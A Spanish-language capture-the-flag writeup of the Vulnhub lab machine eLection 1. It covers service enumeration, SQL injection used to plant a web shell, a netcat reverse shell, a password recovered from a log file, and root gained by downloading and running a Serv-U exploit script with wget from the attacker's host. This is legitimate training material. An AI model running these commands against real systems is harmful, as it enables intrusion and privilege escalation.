---
title: eLection1 Writeup - Vulnhub
date: 2025-03-11
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, eLection1, OSCP Prep, SQLinjection]
image:
  path: /assets/img/commons/vulnhub/Election1/portada.png
---

Anterior [*OSCP Lab 18*](https://lvs3c.github.io/posts/OSCP-GlasgowSmile/)

¡Saludos!

**`OSCP Lab 19`**

En este writeup, realizaremos la máquina [**eLection 1**](https://www.vulnhub.com/entry/election-1,503/). 

Se trata de una máquina **Linux** en la cual veremos:
- **Enumeración de servicios**.
- Acceso a **Panel de login** mediante el desencriptado de una cadena de binarios.
- **Dos formas** de generarnos la conexión al servidor y listar la flag del usuario.
  - Mediante **SQLinjection** obteniendo desde datos de la base hasta generar archivo shell.php para ingresar al sistema.
  - Mediante **SSH**, obteniendo datos de acceso sobre un archivo de logs.
- Y por último, usamos un script para explotar el binario **Serv-U FTP Server** y convertirnos en root, logrando listar la root flag.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.52     00:0c:29:e6:75:ce       VMware, Inc.
10.11.12.200    00:50:56:e9:ee:69       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.413 seconds (106.09 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.52
PING 10.11.12.52 (10.11.12.52) 56(84) bytes of data.
64 bytes from 10.11.12.52: icmp_seq=1 ttl=64 time=0.538 ms

--- 10.11.12.52 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.538/0.538/0.538/0.000 ms
```

## Escaneo y Enumeración

```bash
❯ nmap -sCV 10.11.12.52 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-11 17:08 -03
Nmap scan report for 10.11.12.52
Host is up (0.0022s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.53 seconds
```

El informe de `Nmap` nos revela:
- Puerto `22` servidor `OpenSSH 7.6p1`.
- Puerto `80` servidor `Apache httpd 2.4.29`.


### HTTP - 80


Validamos la web.

![web80](/assets/img/commons/vulnhub/Election1/web80.png){: .center-image }

Continuamos realizando un fuzzing de directorios rápido con el script `http-enum` de nmap sobre el puerto 80.

```bash
❯ nmap -p80 --script http-enum 10.11.12.52 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-11 17:08 -03
Nmap scan report for 10.11.12.52
Host is up (0.00031s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /robots.txt: Robots file
|   /phpinfo.php: Possible information file
|_  /phpmyadmin/: phpMyAdmin

Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds
```

Lanzamos `gobuster` para obtener más información.

```bash
❯ gobuster dir -u http://10.11.12.52 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 403,404 -x php,txt,zip,sh
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.52
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,403
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,sh,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 315] [--> http://10.11.12.52/javascript/]
/robots.txt           (Status: 200) [Size: 30]
/election             (Status: 301) [Size: 313] [--> http://10.11.12.52/election/]
/phpmyadmin           (Status: 301) [Size: 315] [--> http://10.11.12.52/phpmyadmin/]
/phpinfo.php          (Status: 200) [Size: 95401]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
```

Ingresamos a `/election`.

![we80election](/assets/img/commons/vulnhub/Election1/we80election.png){: .center-image }

Lanzamos `gobuster` nuevamente sobre este directorio.

```bash
❯ gobuster dir -u http://10.11.12.52/election -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 403,404 -x php,txt,zip,sh
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.52/election
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              sh,php,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 7003]
/media                (Status: 301) [Size: 319] [--> http://10.11.12.52/election/media/]
/themes               (Status: 301) [Size: 320] [--> http://10.11.12.52/election/themes/]
/data                 (Status: 301) [Size: 318] [--> http://10.11.12.52/election/data/]
/admin                (Status: 301) [Size: 319] [--> http://10.11.12.52/election/admin/]
/lib                  (Status: 301) [Size: 317] [--> http://10.11.12.52/election/lib/]
/languages            (Status: 301) [Size: 323] [--> http://10.11.12.52/election/languages/]
/js                   (Status: 301) [Size: 316] [--> http://10.11.12.52/election/js/]
/card.php             (Status: 200) [Size: 1935]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

Tenemos un panel de administración.

![paneladmin](/assets/img/commons/vulnhub/Election1/paneladmin.png){: .center-image }

Ingresamos a `card.php` y vemos una cadena de binarios.

![card](/assets/img/commons/vulnhub/Election1/card.png){: .center-image }

Usamos [CyberChef](https://gchq.github.io/CyberChef/) para desencriptar el código.

El código genera otro código binario que al ser desencriptado nos brinda los datos de acceso al panel.

![cardcc1](/assets/img/commons/vulnhub/Election1/cardcc1.png){: .center-image }
![cardcc2](/assets/img/commons/vulnhub/Election1/cardcc2.png){: .center-image }

Ingresamos.

![adminpanel](/assets/img/commons/vulnhub/Election1/adminpanel.png){: .center-image }
![adminpass](/assets/img/commons/vulnhub/Election1/adminpass.png){: .center-image }

![dashboard](/assets/img/commons/vulnhub/Election1/dashboard.png){: .center-image }


## Explotación

---

> Tenemos dos formas de explotar la plataforma y generarnos la reverse shell. Mediante lectura del archivo `system.log`{: .filepath} o más entretenido sobre `SQL injection`{: .filepath}.
{: .prompt-tip }


#### 1 - SQL Injection + User Pivoting

Buscamos por `searchsploit`{: .filepath} si existe algo sobre `election 2.0`{: .filepath}.

![electionsqli1](/assets/img/commons/vulnhub/Election1/electionsqli1.png){: .center-image }
![electionsqli2](/assets/img/commons/vulnhub/Election1/electionsqli2.png){: .center-image }

El script utiliza `sqlmap`, pero nosotros lo vamos a hacer manualmente y realizando otro tipo de ataque.

La vulnerabilidad se da cuando listamos las propiedades del usuario admin.

![sqli](/assets/img/commons/vulnhub/Election1/sqli.png){: .center-image }

Capturamos la solicitud con `BurpSuite` y procedemos a listar las bases de datos.

![schemaname](/assets/img/commons/vulnhub/Election1/schemaname.png){: .center-image }

Listamos las tablas y las columnas.

![tablename](/assets/img/commons/vulnhub/Election1/tablename.png){: .center-image }

![columnname](/assets/img/commons/vulnhub/Election1/columnname.png){: .center-image }

Extraemos los datos y desencriptamos el hash md5.

![passlove](/assets/img/commons/vulnhub/Election1/passlove.png){: .center-image }

![md5](/assets/img/commons/vulnhub/Election1/md5.png){: .center-image }

Tenemos los datos de acceso al panel de login, el cual ya disponemos.

**`¿Qué más podemos hacer partiendo de una sqlinjection?`**

Vamos a intentar leer archivos del OS.

![bs3](/assets/img/commons/vulnhub/Election1/bs3.png){: .center-image }

Sabiendo que podemos leer archivos del OS, vamos a intentar crear un archivo `shell.php`{: .filepath} dentro de la raíz, para generarnos la reverse shell mediante la ejecución de un parámetro (c) por GET.

![bs4](/assets/img/commons/vulnhub/Election1/bs4.png){: .center-image }

Si bien el código de la respuesta es 403 (error), el archivo se creó correctamente, validamos.

![shell](/assets/img/commons/vulnhub/Election1/shell.png){: .normal }

Comprobamos si tenemos ejecución de código y generamos la reverse shell.

![rs2](/assets/img/commons/vulnhub/Election1/rs2.png){: .normal }

![rs3](/assets/img/commons/vulnhub/Election1/rs3.png){: .center-image }

Al ganar acceso al sistema, lo hacemos como el usuario `www-data`, debemos realizar `user pivoting`{: .filepath}.

Listando los archivos de logs del sistema, damos con el password del usuario `love`.

```bash
❯ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.52] 40866
bash: cannot set terminal process group (747): Inappropriate ioctl for device
bash: no job control in this shell
www-data@election:/var/www/html$

www-data@election:/home/love$ cat /var/www/html/election/admin/logs/system.log                                                    
[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
[2020-04-03 00:13:53] Love added candidate 'Love'.
[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).
[2025-03-11 23:18:06] Love has been logged in from Unknown IP on Firefox (Linux).
```

#### 2 - Archivo Log

Dentro de la plataforma, en las configuraciones del sistema, podemos observar el archivo de logs, en el cual se incluyen las credenciales del usuario `love`.

![viewlogs](/assets/img/commons/vulnhub/Election1/viewlogs.png){: .center-image }
![viewlogs2](/assets/img/commons/vulnhub/Election1/viewlogs2.png){: .normal }


> La idea de la máquina es leer el archivo `system.log`{: .filepath}, pero buscar alternativas/vectores de ataque para aprender, **es lo más interesante**.
{: .prompt-info }


## Escalación de privilegios

---

Somos el usuario `love`, debemos conseguir elevar nuestro privilegio.

Listamos la user flag.

```bash
love@election:~/Desktop$ cat user.txt
cd38ac698c0d793a5236d01003f692b0
```

Listamos los binarios SUID del sistema.

```bash
love@election:/var/www/html/election/media/panitia$ find / -perm -4000 2>/dev/null | grep -v snap
/usr/bin/arping
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/sbin/pppd
/usr/local/Serv-U/Serv-U
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/bin/fusermount
/bin/ping
/bin/umount
/bin/mount
/bin/su
/home/love
```

Nos llama la atención `Serv-U`. Buscamos por `searchsploit`{: .filepath} y damos con un script.

![servu2](/assets/img/commons/vulnhub/Election1/servu2.png){: .center-image }

Compartimos el script con la máquina víctima, lo ejecutamos y somos root.

Listamos la root flag.

```bash
love@election:/tmp$ wget 10.11.12.10/47173.sh
--2025-03-12 01:34:39--  http://10.11.12.10/47173.sh
Connecting to 10.11.12.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1163 (1.1K) [text/x-sh]
Saving to: ‘47173.sh’

47173.sh                              100%[=======================================================================>]   1.14K  --.-KB/s    in 0s

2025-03-12 01:34:39 (242 MB/s) - ‘47173.sh’ saved [1163/1163]


love@election:/tmp$ chmod +x 47173.sh

love@election:/tmp$ ./47173.sh
[*] Launching Serv-U ...
sh: 1: : Permission denied
[+] Success:
-rwsr-xr-x 1 root root 1113504 Mar 12 01:34 /tmp/sh
[*] Launching root shell: /tmp/sh
sh-4.4# id
uid=1000(love) gid=1000(love) euid=0(root) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)
sh-4.4# cd /root
sh-4.4# ls
root.txt
sh-4.4# cat root.txt
5238feefc4ffe09645d97e9ee49bc3a6
sh-4.4#
```

Hope it helps!